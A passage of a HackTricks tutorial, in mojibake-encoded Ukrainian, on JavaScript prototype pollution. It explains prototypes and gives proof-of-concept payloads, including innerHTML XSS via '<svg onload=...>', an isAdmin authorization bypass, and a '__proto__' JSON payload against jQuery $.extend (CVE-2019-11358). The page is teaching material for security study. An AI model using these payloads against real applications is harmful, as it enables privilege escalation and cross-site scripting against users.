# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>

## –û–±'—î–∫—Ç–∏ –≤ JavaScript <a href="#id-053a" id="id-053a"></a>

–û–±'—î–∫—Ç–∏ –≤ JavaScript —Å—É—Ç—Ç—î–≤–æ —î –∫–æ–ª–µ–∫—Ü—ñ—è–º–∏ –ø–∞—Ä –∫–ª—é—á-–∑–Ω–∞—á–µ–Ω–Ω—è, –≤—ñ–¥–æ–º–∏—Ö —è–∫ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ. –û–±'—î–∫—Ç –º–æ–∂–Ω–∞ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `Object.create` –∑ `null` —è–∫ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–º, —â–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ –ø–æ—Ä–æ–∂–Ω—ñ–π –æ–±'—î–∫—Ç. –¶–µ–π –º–µ—Ç–æ–¥ –¥–æ–∑–≤–æ–ª—è—î —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –æ–±'—î–∫—Ç –±–µ–∑ —É—Å–ø–∞–¥–∫–æ–≤–∞–Ω–∏—Ö –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç–µ–π.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
–ü–æ—Ä–æ–∂–Ω—ñ–π –æ–±'—î–∫—Ç –ø–æ–¥—ñ–±–Ω–∏–π –¥–æ –ø–æ—Ä–æ–∂–Ω—å–æ–≥–æ —Å–ª–æ–≤–Ω–∏–∫–∞, —è–∫–∏–π –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–π —è–∫ `{}`.

### –§—É–Ω–∫—Ü—ñ—ó —Ç–∞ –ö–ª–∞—Å–∏ –≤ JavaScript

–£ JavaScript –∫–ª–∞—Å–∏ —Ç–∞ —Ñ—É–Ω–∫—Ü—ñ—ó —Ç—ñ—Å–Ω–æ –ø–æ–≤'—è–∑–∞–Ω—ñ, –ø—Ä–∏—á–æ–º—É —Ñ—É–Ω–∫—Ü—ñ—ó —á–∞—Å—Ç–æ –≤–∏—Å—Ç—É–ø–∞—é—Ç—å —É —Ä–æ–ª—ñ –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä—ñ–≤ –¥–ª—è –∫–ª–∞—Å—ñ–≤. –ù–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –≤–±—É–¥–æ–≤–∞–Ω–æ—ó –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ –∫–ª–∞—Å—ñ–≤ —É JavaScript, –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä–∏ –º–æ–∂—É—Ç—å –µ–º—É–ª—é–≤–∞—Ç–∏ –ø–æ–≤–µ–¥—ñ–Ω–∫—É –∫–ª–∞—Å—É.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### –ü—Ä–æ—Ç–æ—Ç–∏–ø–∏ –≤ JavaScript

JavaScript –¥–æ–∑–≤–æ–ª—è—î –∑–º—ñ–Ω—é–≤–∞—Ç–∏, –¥–æ–¥–∞–≤–∞—Ç–∏ –∞–±–æ –≤–∏–¥–∞–ª—è—Ç–∏ –∞—Ç—Ä–∏–±—É—Ç–∏ –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è. –¶—è –≥–Ω—É—á–∫—ñ—Å—Ç—å –¥–æ–∑–≤–æ–ª—è—î –¥–∏–Ω–∞–º—ñ—á–Ω–æ —Ä–æ–∑—à–∏—Ä—é–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª –∫–ª–∞—Å—É.

–§—É–Ω–∫—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ `toString` —Ç–∞ `valueOf`, –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–º—ñ–Ω–µ–Ω—ñ –¥–ª—è –∑–º—ñ–Ω–∏ —ó—Ö–Ω—å–æ—ó –ø–æ–≤–µ–¥—ñ–Ω–∫–∏, –¥–µ–º–æ–Ω—Å—Ç—Ä—É—é—á–∏ –∞–¥–∞–ø—Ç–∏–≤–Ω—É –ø—Ä–∏—Ä–æ–¥—É –ø—Ä–æ—Ç–æ—Ç–∏–ø–Ω–æ—ó —Å–∏—Å—Ç–µ–º–∏ JavaScript.

## –ù–∞—Å–ª—ñ–¥—É–≤–∞–Ω–Ω—è

–£ –ø—Ä–æ—Ç–æ—Ç–∏–ø–Ω–æ–º—É –ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—ñ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ/–º–µ—Ç–æ–¥–∏ —É—Å–ø–∞–¥–∫–æ–≤—É—é—Ç—å—Å—è –æ–±'—î–∫—Ç–∞–º–∏ –≤—ñ–¥ –∫–ª–∞—Å—ñ–≤. –¶—ñ –∫–ª–∞—Å–∏ —Å—Ç–≤–æ—Ä—é—é—Ç—å—Å—è —à–ª—è—Ö–æ–º –¥–æ–¥–∞–≤–∞–Ω–Ω—è –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç–µ–π/–º–µ—Ç–æ–¥—ñ–≤ –∞–±–æ –¥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ —ñ–Ω—à–æ–≥–æ –∫–ª–∞—Å—É, –∞–±–æ –¥–æ –ø–æ—Ä–æ–∂–Ω—å–æ–≥–æ –æ–±'—î–∫—Ç–∞.

–°–ª—ñ–¥ –∑–∞—É–≤–∞–∂–∏—Ç–∏, —â–æ –∫–æ–ª–∏ –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å –¥–æ–¥–∞—î—Ç—å—Å—è –¥–æ –æ–±'—î–∫—Ç–∞, —è–∫–∏–π —Å–ª—É–∂–∏—Ç—å –ø—Ä–æ—Ç–æ—Ç–∏–ø–æ–º –¥–ª—è —ñ–Ω—à–∏—Ö –æ–±'—î–∫—Ç—ñ–≤ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `myPersonObj`), —É—Å–ø–∞–¥–∫–æ–≤–∞–Ω—ñ –æ–±'—î–∫—Ç–∏ –æ—Ç—Ä–∏–º—É—é—Ç—å –¥–æ—Å—Ç—É–ø –¥–æ —Ü—ñ—î—ó –Ω–æ–≤–æ—ó –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ. –û–¥–Ω–∞–∫ —Ü—è –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å –Ω–µ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î—Ç—å—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ, —è–∫—â–æ —ó—ó –Ω–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —è–≤–Ω–æ.

## –ó–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è \_\_proto\_\_ <a href="#id-0d0a" id="id-0d0a"></a>

## –î–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –≤ JavaScript

–û–±'—î–∫—Ç–∏ JavaScript –≤–∏–∑–Ω–∞—á–∞—é—Ç—å—Å—è –ø–∞—Ä –∫–ª—é—á-–∑–Ω–∞—á–µ–Ω–Ω—è —Ç–∞ —É—Å–ø–∞–¥–∫–æ–≤—É—é—Ç—å—Å—è –≤—ñ–¥ –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –æ–±'—î–∫—Ç–∞ JavaScript. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –∑–º—ñ–Ω–∞ –ø—Ä–æ—Ç–æ—Ç–∏–ø—É Object –º–æ–∂–µ –≤–ø–ª–∏–Ω—É—Ç–∏ –Ω–∞ –≤—Å—ñ –æ–±'—î–∫—Ç–∏ –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ.

–î–∞–≤–∞–π—Ç–µ —Å–∫–æ—Ä–∏—Å—Ç–∞—î–º–æ—Å—è —ñ–Ω—à–∏–º –ø—Ä–∏–∫–ª–∞–¥–æ–º –¥–ª—è –ø–æ—è—Å–Ω–µ–Ω–Ω—è:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
–î–æ—Å—Ç—É–ø –¥–æ –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –æ–±'—î–∫—Ç–∞ –º–æ–∂–ª–∏–≤–∏–π —á–µ—Ä–µ–∑:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
–î–æ–¥–∞–≤—à–∏ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ –¥–æ –ø—Ä–æ—Ç–æ—Ç–∏–ø—É Object, –∫–æ–∂–µ–Ω –æ–±'—î–∫—Ç JavaScript —É—Å–ø–∞–¥–∫—É—î —Ü—ñ –Ω–æ–≤—ñ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É

–î–ª—è —Å—Ü–µ–Ω–∞—Ä—ñ—é, –¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `__proto__` –æ–±–º–µ–∂–µ–Ω–æ, –∑–º—ñ–Ω–∞ –ø—Ä–æ—Ç–æ—Ç–∏–ø—É —Ñ—É–Ω–∫—Ü—ñ—ó —î –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–æ—é:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
–¶–µ –≤–ø–ª–∏–≤–∞—î –ª–∏—à–µ –Ω–∞ –æ–±'—î–∫—Ç–∏, —Å—Ç–≤–æ—Ä–µ–Ω—ñ –∑ –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä–∞ `Vehicle`, –Ω–∞–¥–∞—é—á–∏ —ó–º –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ `beep`, `hasWheels`, `honk` —Ç–∞ `isElectric`.

–î–≤–∞ –º–µ—Ç–æ–¥–∏ –≥–ª–æ–±–∞–ª—å–Ω–æ–≥–æ –≤–ø–ª–∏–≤—É –Ω–∞ –æ–±'—î–∫—Ç–∏ JavaScript —á–µ—Ä–µ–∑ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –≤–∫–ª—é—á–∞—é—Ç—å:

1. –ó–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä—è–º–æ `Object.prototype`:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. –ó–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä–∞ –¥–ª—è —à–∏—Ä–æ–∫–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–Ω–æ—ó —Å—Ç—Ä—É–∫—Ç—É—Ä–∏:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
–ü—ñ—Å–ª—è —Ü–∏—Ö –æ–ø–µ—Ä–∞—Ü—ñ–π –∫–æ–∂–µ–Ω –æ–±'—î–∫—Ç JavaScript –º–æ–∂–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –º–µ—Ç–æ–¥–∏ `goodbye` —Ç–∞ `greet`.

## –ó–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è —ñ–Ω—à–∏—Ö –æ–±'—î–∫—Ç—ñ–≤

### –í—ñ–¥ –∫–ª–∞—Å—É –¥–æ Object.prototype

–£ —Å—Ü–µ–Ω–∞—Ä—ñ—ó, –¥–µ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–∞–±—Ä—É–¥–Ω–∏—Ç–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π –æ–±'—î–∫—Ç** —ñ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **–¥—ñ—Å—Ç–∞—Ç–∏—Å—è –¥–æ `Object.prototype`**, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –π–æ–≥–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∫–æ–¥—É:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### –ó–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –µ–ª–µ–º–µ–Ω—Ç—ñ–≤ –º–∞—Å–∏–≤—É

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ç–∞–∫ —è–∫ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–±—Ä—É–¥–Ω—é–≤–∞—Ç–∏ –∞—Ç—Ä–∏–±—É—Ç–∏ –æ–±'—î–∫—Ç—ñ–≤ –≤ JS, —è–∫—â–æ —É –≤–∞—Å —î –¥–æ—Å—Ç—É–ø –¥–æ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –º–∞—Å–∏–≤—É, –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ **–∑–∞–±—Ä—É–¥–Ω—é–≤–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –º–∞—Å–∏–≤—É**, –¥–æ—Å—Ç—É–ø–Ω—ñ **–∑–∞ —ñ–Ω–¥–µ–∫—Å–∞–º–∏** (–∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è, —Ç–æ–º—É –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–∞–±—Ä—É–¥–Ω—é–≤–∞—Ç–∏ —ñ–Ω–¥–µ–∫—Å–∏, —è–∫—ñ —è–∫–æ—Å—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è, –∞–ª–µ –Ω–µ –∑–∞–ø–∏—Å—É—é—Ç—å—Å—è).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### –ó–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –µ–ª–µ–º–µ–Ω—Ç—ñ–≤ Html

–ü—Ä–∏ –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó –µ–ª–µ–º–µ–Ω—Ç–∞ HTML —á–µ—Ä–µ–∑ JS –º–æ–∂–Ω–∞ **–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏** –∞—Ç—Ä–∏–±—É—Ç **`innerHTML`**, —â–æ–± –≤—ñ–Ω –∑–∞–ø–∏—Å–∞–≤ **–¥–æ–≤—ñ–ª—å–Ω–∏–π HTML-–∫–æ–¥.** [–Ü–¥–µ—è —Ç–∞ –ø—Ä–∏–∫–ª–∞–¥ –∑ —Ü—å–æ–≥–æ –æ–ø–∏—Å—É](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## –ü—Ä–∏–∫–ª–∞–¥–∏

### –ë–∞–∑–æ–≤–∏–π –ü—Ä–∏–∫–ª–∞–¥

–ó–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è —á–µ—Ä–µ–∑ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –ø—Ä–æ–≥—Ä–∞–º–∏, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ –≤ `Object.prototype`. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –æ—Å–∫—ñ–ª—å–∫–∏ –±—ñ–ª—å—à—ñ—Å—Ç—å –æ–±'—î–∫—Ç—ñ–≤ –ø–æ—Ö–æ–¥—è—Ç—å –≤—ñ–¥ `Object.prototype`

–ù–∞–π–ø—Ä–æ—Å—Ç—ñ—à–∏–π –ø—Ä–∏–∫–ª–∞–¥ - –¥–æ–¥–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –¥–æ **–Ω–µ–≤–∏–∑–Ω–∞—á–µ–Ω–æ–≥–æ –∞—Ç—Ä–∏–±—É—Ç—É –æ–±'—î–∫—Ç–∞**, —è–∫–∏–π –±—É–¥–µ –ø–µ—Ä–µ–≤—ñ—Ä–µ–Ω–∏–π, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥:
```javascript
if (user.admin) {
```
–Ø–∫—â–æ –∞—Ç—Ä–∏–±—É—Ç **`admin` –Ω–µ –≤–∏–∑–Ω–∞—á–µ–Ω–æ**, –º–æ–∂–Ω–∞ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è PP —Ç–∞ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –π–æ–≥–æ –Ω–∞ True –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
–ú–µ—Ö–∞–Ω—ñ–∑–º –ø–æ–ª—è–≥–∞—î –≤ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—ñ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—è–º–∏ —Ç–∞–∫, —â–æ —è–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–∞—î –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –ø–µ–≤–Ω–∏–º–∏ –≤—Ö—ñ–¥–Ω–∏–º–∏ –¥–∞–Ω–∏–º–∏, –≤—ñ–Ω –º–æ–∂–µ –∑–º—ñ–Ω–∏—Ç–∏ –ø—Ä–æ—Ç–æ—Ç–∏–ø –≤—Å—ñ—Ö –æ–±'—î–∫—Ç—ñ–≤ —É –¥–æ–¥–∞—Ç–∫—É. –¶—è –º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ—è –∑–∞–∑–≤–∏—á–∞–π –≤–∫–ª—é—á–∞—î –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ `__proto__`, —è–∫–∞ –≤ JavaScript —î —Å–∏–Ω–æ–Ω—ñ–º–æ–º –ø—Ä—è–º–æ–≥–æ –∑–º—ñ–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –æ–±'—î–∫—Ç–∞.

–£–º–æ–≤–∏, –∑–∞ —è–∫–∏—Ö —Ü–µ–π –∞—Ç–∞–∫–∞ –º–æ–∂–µ –±—É—Ç–∏ —É—Å–ø—ñ—à–Ω–æ –≤–∏–∫–æ–Ω–∞–Ω–∞, —è–∫ –æ–ø–∏—Å–∞–Ω–æ –≤ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º—É [–¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—ñ](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf), –≤–∫–ª—é—á–∞—é—Ç—å:

* –í–∏–∫–æ–Ω–∞–Ω–Ω—è —Ä–µ–∫—É—Ä—Å–∏–≤–Ω–æ–≥–æ –∑–ª–∏—Ç—Ç—è.
* –í–∏–∑–Ω–∞—á–µ–Ω–Ω—è –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç–µ–π –Ω–∞ –æ—Å–Ω–æ–≤—ñ —à–ª—è—Ö—É.
* –ö–ª–æ–Ω—É–≤–∞–Ω–Ω—è –æ–±'—î–∫—Ç—ñ–≤.

### –ü–µ—Ä–µ–≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### –ü—Ä–æ—Ç–æ-–∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –¥–æ RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## –ü—Ä–æ—Ç–æ-–∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –Ω–∞ –∫–ª—ñ—î–Ω—Ç—Å—å–∫—ñ–π —Å—Ç–æ—Ä–æ–Ω—ñ –¥–æ XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019‚Äì11358: –ê—Ç–∞–∫–∞ –ø—Ä–æ—Ç–æ—Ç–∏–ø–Ω–æ–≥–æ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è —á–µ—Ä–µ–∑ jQuery $ .extend

[–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –≤—ñ–¥–æ–º–æ—Å—Ç–µ–π –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —Ü—é —Å—Ç–∞—Ç—Ç—é](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7) –£ jQuery —Ñ—É–Ω–∫—Ü—ñ—è `$ .extend` –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –ø—Ä–æ—Ç–æ—Ç–∏–ø–Ω–æ–≥–æ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è, —è–∫—â–æ —Ñ—É–Ω–∫—Ü—ñ—é –≥–ª–∏–±–æ–∫–æ–≥–æ –∫–æ–ø—ñ—é–≤–∞–Ω–Ω—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ. –¶—è —Ñ—É–Ω–∫—Ü—ñ—è —á–∞—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –∫–ª–æ–Ω—É–≤–∞–Ω–Ω—è –æ–±'—î–∫—Ç—ñ–≤ –∞–±–æ –æ–±'—î–¥–Ω–∞–Ω–Ω—è –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç–µ–π –∑ –æ–±'—î–∫—Ç–∞ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º. –û–¥–Ω–∞–∫, –ø—Ä–∏ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ñ–π –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω—ñ –¥–ª—è –Ω–æ–≤–æ–≥–æ –æ–±'—î–∫—Ç–∞, –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω—ñ –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –∑–∞–º—ñ—Å—Ç—å —Ü—å–æ–≥–æ. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
